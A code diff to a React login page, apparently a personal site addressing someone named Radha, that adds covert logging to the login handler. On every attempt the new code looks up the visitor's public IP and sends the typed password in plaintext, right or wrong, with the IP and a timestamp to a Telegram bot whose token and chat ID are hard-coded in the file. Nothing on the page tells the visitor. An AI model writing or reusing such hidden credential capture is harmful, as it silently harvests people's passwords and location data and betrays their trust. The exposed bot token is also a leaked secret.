@@ -25,15 +25,62 @@ const LoginPage: React.FC<LoginPageProps> = ({ onLoginSuccess }) => {
     setIsLoading(true);
     setError('');
 
-    // Simulate loading for better UX
-    await new Promise(resolve => setTimeout(resolve, 800));
+    try {
+      // Get user's public IP address
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      const userIP = ipData.ip || 'Unknown';
 
-    if (checkPassword(password)) {
-      onLoginSuccess();
-    } else {
-      setError('Sorry wrong, try again Radha 💔');
+      // Get current date and time
+      const now = new Date();
+      const dateStr = now.toLocaleDateString('en-GB'); // DD/MM/YYYY format
+      const timeStr = now.toLocaleTimeString('en-US', { 
+        hour: '2-digit', 
+        minute: '2-digit',
+        hour12: true 
+      }); // HH:MM AM/PM format
+
+      // Check password
+      const isPasswordCorrect = checkPassword(password);
+      const status = isPasswordCorrect ? 'Success ✅' : 'Wrong ❌';
+
+      // Prepare Telegram message
+      const telegramMessage = `🔔 Login Attempt
+Status: ${status}
+Entered Password: ${password}
+IP Address: ${userIP}
+Time: ${dateStr} - ${timeStr}`;
+
+      // Send Telegram notification
+      await fetch('https://api.telegram.org/bot7731464090:AAEvV2JmckYlg9HyrS40pDUDVofU-VosoQ4/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: 809190054,
+          text: telegramMessage
+        })
+      });
+
+      // Simulate loading for better UX
+      await new Promise(resolve => setTimeout(resolve, 800));
+
+      // Handle login result
+      if (isPasswordCorrect) {
+        onLoginSuccess();
+      } else {
+        setError('Sorry wrong, try again Radha 💔');
+      }
+    } catch (error) {
+      console.error('Error during login process:', error);
+      
+      // Still check password even if notification fails
+      if (checkPassword(password)) {
+        onLoginSuccess();
+      } else {
+        setError('Sorry wrong, try again Radha 💔');
+      }
     }
-    
+
     setIsLoading(false);
   };
 
